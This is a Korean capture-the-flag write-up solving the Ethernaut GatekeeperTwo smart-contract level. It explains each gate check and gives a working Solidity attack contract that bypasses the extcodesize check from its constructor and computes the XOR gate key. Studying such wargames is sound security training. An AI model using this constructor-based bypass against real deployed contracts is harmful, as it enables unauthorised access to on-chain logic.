https://teberr.notion.site/Ethernaut-GateKeeperTwo-be5b690ed0704f6caca267ede1ae7143

![문제.PNG](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/dc5a821e-a42b-4676-ac6f-2fa584a53e05/%EB%AC%B8%EC%A0%9C.png)

> 이 단계를 통과하기 위해서는 gatekeeper를 통과하고 entrant로 등록하세요

힌트:
- 1번 게이트는 이전 문제와 동일합니다.
- solidity 어셈블리는 [here](http://solidity.readthedocs.io/en/v0.4.23/assembly.html) 에서 자세히 살펴볼 수 있습니다. 이번 문제에서 쓰인 extcodesize는 주어진 컨트랙트의 코드 크기를 반환합니다.
- ^ 연산자는 XOR 연산자입니다.
> 

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract GatekeeperTwo {

  address public entrant;

  modifier gateOne() {
    require(msg.sender != tx.origin);
    _;
  }

  modifier gateTwo() {
    uint x;
    assembly { x := extcodesize(caller()) }
    require(x == 0);
    _;
  }

  modifier gateThree(bytes8 _gateKey) {
    require(uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ uint64(_gateKey) == type(uint64).max);
    _;
  }

  function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) {
    entrant = tx.origin;
    return true;
  }
}
```

# 코드 분석 및 공격 설계

각 gate modifier를 통과하면 문제를 클리어할 수 있으므로 modifier를 하나 씩 살펴보자

### modifier gateOne()

```solidity
  modifier gateOne() {
    require(msg.sender != tx.origin);
    _;
  }
```

1번 조건은 msg.sender와 tx.origin이 서로 같지 않아야 한다.

이때 msg.sender는 문제 컨트랙트를 호출한 주소를 의미하고 tx.origin은 트랜잭션을 처음 시작한 주소를 의미한다.

따라서 컨트랙트를 만들어서 

EOA → 공격 컨트랙트 → 문제 컨트랙트

와 같이 작성하면 msg.sender는 공격 컨트랙트의 주소, tx.origin은 내 메타마스크 지갑 주소가 되어 1번 조건을 통과할 수 있다.

즉 1번 조건은 컨트랙트를 만들어서 이 문제를 해결하라는 뜻이다. 

### modifier gateTwo()

```solidity
  modifier gateTwo() {
    uint x;
    assembly { x := extcodesize(caller()) }
    require(x == 0);
    _;
  }
```

extcodesize(caller())의 결과를 x에 저장하고 x 값이 0이어야 한다.

이 때 어셈블리 extcodesize(caller())의 의미는 호출한 msg.sender의 코드 크기를 의미한다. 

1번 조건에서 컨트랙트를 작성하여 조건을 통과해야 함을 알았지만 그 컨트랙트가 이 문제를 호출할 때의 코드 크기는 0이어야 한다는 조건이다.

이 조건을 만족하기 위해서는 공격 컨트랙트의 constructor에서 문제 인스턴스에 접근하면 된다.

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract GateKeeperTwo {
  constructor(){}
  function gateOne() public view returns  (address) {
    return msg.sender;
  }
  function gateTwo() public view returns(bool){
    uint x;
    assembly { x := extcodesize(caller()) }
    if(x == 0){
        return true;
    }else{
        return false;
    }
  
}

contract GateKeeperTwoAttack{
    address public msgsender;
    bool public result;
    address public msgsender2;
    constructor(address target){
        msgsender=GateKeeperTwo(target).gateOne();
        result=GateKeeperTwo(target).gateTwo();
        msgsender2=address(this);
    }
}
```

테스트를 위해서 컨트랙트를 직접 작성하여서 확인해보았다.

![테스트.PNG](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/3a701e6d-de8f-491b-becd-56e6208e6158/%ED%85%8C%EC%8A%A4%ED%8A%B8.png)

공격 컨트랙트인 GateKeeperTwoAttack의 생성자에서 대상 컨트랙트인 GateKeeperTwo에게 실행한 결과이다. 각각

1. msgsender = GateKeeperTwo가 인지한 msg.sender의 주소 
2. msgsender2 = 공격 컨트랙트의 생성자에서 내 공격 컨트랙트의 주소를 확인
3. 생성자에서 gateKeeperTwo를 호출했을 때 extcodesize 값이 0인지 확인

테스트한 결과이다.

생성자에서 대상 컨트랙트extcodesize가 0임을 확인했으므로 정리해보면 2번 조건은 공격 컨트랙트의 생성자에서 대상 컨트랙트를 호출하라는 의미가 된다.

### modifier gateThree(bytes8 _gateKey)

```solidity
  modifier gateThree(bytes8 _gateKey) {
    require(uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ uint64(_gateKey) == type(uint64).max);
    _;
  }
```

위 연산의 결과를 참으로 만족하는 gateKey 값을 알아내야 한다. 

이는 단순하게 등호의 양변에 같은 연산을 했을 때 결과가 바뀌지 않는 다는 점만 사용해도 풀린다.

uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ uint64(_gateKey) == type(uint64).max

의 양변에 uint64(_gateKey)를 XOR 연산을 하면 아래와 같은 식이 된다.

uint64(bytes8(keccak256(abi.encodePacked(msg.sender))))  == type(uint64).max ^ uint64(_gateKey)

여기서 type(uint64).max를 양변에 XOR 연산을 하면 아래와 같이 된다.

uint64(bytes8(keccak256(abi.encodePacked(msg.sender))))  ^ type(uint64).max ==  uint64(_gateKey)

즉 gateKey값을 구하는 식이 만들어졌다.

```solidity
gateKey = uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ type(uint64).max;
_gateKey=bytes8(gateKey);
```

이 식을 바탕으로 이제 공격하면 된다.

# 공격

먼저 인스턴스의 주소를 get new Instance를 통해 가져오면 아래와 같다.

```solidity
=> Instance address
0xE02e4fCd6deF64F020DCAc73d2F5cc4e3F398c45
```

![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/e8ca3e30-2bee-4045-8597-3199e93cf2fe/Untitled.png)

```solidity
await contract.entrant()
'0x0000000000000000000000000000000000000000'
```

이 entrant 값을 공격을 통해 내 메타마스크 주소로 바꿔주면 된다.

이를 바탕으로 위의 세가지 조건을 만족하는 공격 컨트랙트를 작성하자.

1. 공격 컨트랙트를 작성해야 한다.
2. 공격 컨트랙트에서 문제 인스턴스의 enter 함수에 접근할 때는 생성자(constructor)에서 접근해야 한다.
3. 공식에 따라 gateKey값을 계산하여 인자로 넣어줘야한다.

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IGateKeeperTwo {
  function enter(bytes8) external;
}

contract GateKeeperTwoAttack{

    constructor(address target){
        uint64 gateKey;
        bytes8 _gateKey;
        gateKey = uint64(bytes8(keccak256(abi.encodePacked(address(this))))) ^ type(uint64).max;
        _gateKey=bytes8(gateKey);
        IGateKeeperTwo(target).enter(_gateKey);
    }
}
```

이 공격 컨트랙트를 대상 인스턴스를 인자로 하여 배포하는 트랜잭션을 발생시키면 공격이 수행된다.

```solidity
await contract.entrant()
'0x83b26d6A3D3FaBd9F0A5f1d69DCA1CE6cc4eA39a'
```

공격 후 대상 인스턴스의 entrant 값을 다시 확인해보면 내 메타마스크 주소로 변경된 것을 확인할 수 있다.

![성공.PNG](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/180b17a0-2243-483c-944a-646da15cca2e/%EC%84%B1%EA%B3%B5.png)

submit instance로 제출하면 콘솔에서 성공적으로 공격을 하였음을 알리는 표시가 뜬다.
